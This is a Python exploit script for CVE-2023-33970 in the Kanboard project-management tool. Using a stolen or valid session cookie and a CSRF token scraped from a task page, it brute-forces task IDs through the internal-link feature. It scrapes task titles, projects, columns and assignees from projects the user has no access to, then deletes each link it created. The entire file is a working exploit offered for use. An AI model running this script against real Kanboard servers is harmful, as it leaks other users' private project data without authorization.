# CVE-2023-33970 | https://github.com/kanboard/kanboard/security/advisories/GHSA-wfch-8rhv-v286
import re
import sys
import requests
from prettytable import PrettyTable
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Variables
CSRF_TOKEN = ""
TARGET_URL = sys.argv[1]
SESSION_ID = sys.argv[2]
MY_TASK_ID = sys.argv[3]
MY_TASK_URL = f"{TARGET_URL}/task/{MY_TASK_ID}"
CREATE_LINK = f"{TARGET_URL}/task/{MY_TASK_ID}/internal-link/save"
REMOVE_LINK = f"{TARGET_URL}/?controller=TaskInternalLinkController&action=remove&link_id=%s&task_id={MY_TASK_ID}&csrf_token="

# Define tasks table
table = PrettyTable()
table.field_names = ["Task Title", "Project Title", "Task Column", "Task Assigned"]
table.align["Task Title"] = "l"
table.align["Project Title"] = "l"
table.align["Task Column"] = "l"
table.align["Task Assigned"] = "l"

def logo():
    print("""
  _  __          _    _    ___ _____ 
 | |/ /__ _ _ _ | |__| |  | _ \_   _|
 | ' </ _` | ' \| '_ \ |__|  _/ | |  
 |_|\_\__,_|_||_|_.__/____|_|   |_|  
                  Exploit made by: castilho               
          """)

def get_csrf_token(response_html):
    # Extract CSRF token from the response HTML using regex
    csrf_token_regex = r'name="csrf_token" value="([^"]+)'
    match = re.search(csrf_token_regex, response_html)
    
    if match:
        csrf_token = match.group(1)
        return csrf_token
    
    return ""

def generate_session():
    # Create a session with necessary headers and cookies
    session = requests.Session()
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    session.headers.update(headers)
    session.cookies.update({'KB_SID': SESSION_ID})
    return session

def main():
    # Variables
    number_tasks = 0
    
    session = generate_session()
    my_task_response = session.get(MY_TASK_URL)
    
    print(f"[*] Retrieving HTML content from the session...")
    
    CSRF_TOKEN = get_csrf_token(my_task_response.text)
    
    # Check if we could retrieve the CSRF Token
    if CSRF_TOKEN == "":
        print("[-] Couldn't retrieve the CSRF Token. Please check your Session ID or Task ID...")
        exit()
        
    print(f"[+] Obtained CSRF token: {CSRF_TOKEN}\n")
    print("[*] Started brute-forcing tasks...")
    
    # Brute-force tasks in projects
    for task_id in range(1000):
        
        # Multipart data to create an internal link
        multi_data = MultipartEncoder(
            fields={
                'csrf_token': CSRF_TOKEN,
                'opposite_task_id': str(task_id),
                'link_id': '1',
                'title': '',
            },
            boundary='----WebKitFormBoundaryhkj3WRLYXccSclPh'
        )

        # POST request to create an internal link
        create_link_response = session.post(CREATE_LINK, headers={'Content-Type': multi_data.content_type}, data=multi_data)

        # Check if a task was found
        if len(create_link_response.content) == 0:
            
            # Do a GET request to our task endpoint 
            # to retrieve the found task values
            my_task_response = session.get(MY_TASK_URL)
            
            # Regex to find the values of project title, assigned user, and link ID
            pattern_project_values = r'<a href=".+?"[^>]*>([^<]+)</a>\s*\(([^)]+)\)'
            pattern_assigned_user = r'<a href="/user/show/\d+" class="" title=\'\' >(.*?)</a>'
            pattern_link_id = r'/\?controller=TaskInternalLinkController&amp;action=confirm&amp;link_id=(\d+)'
            
            # Make the necessary searches
            match_project = re.search(pattern_project_values, my_task_response.text)
            match_assigned = re.search(pattern_assigned_user, my_task_response.text)
            match_link_id = re.search(pattern_link_id, my_task_response.text)
            
            # Check if a task and project were found along with their link ID
            if match_project and match_link_id:
                
                # Check if someone is assigned to that task
                if match_assigned:
                    user_assigned = match_assigned.group(1)
                else:
                    user_assigned = "Not Assigned"
                
                # Get the link of the task and project values
                task_link_id = match_link_id.group(1)
                task_value, project_value = match_project.groups()
                
                if len(project_value.split(" - ")) > 1:
                    task_column = project_value.split(" - ")[1]
                    project_name = project_value.split(" - ")[0]
                else:
                    task_column = project_value.split(" - ")[0]
                    project_name = ""
                
                table.add_row([task_value, project_name, task_column, user_assigned])
                session.get((REMOVE_LINK % task_link_id) + CSRF_TOKEN)
                
                number_tasks += 1
                
    # Display the final leaked information
    if number_tasks > 0:
        print(f"[+] Number of tasks found: {number_tasks}")
        print("[+] Table of all tasks in all projects:\n")
        print(table)
    else:
        print("[-] Didn't find any tasks. It's either patched or your company needs to put in some work... :/\n")

if __name__ == '__main__':
    logo()
    main()
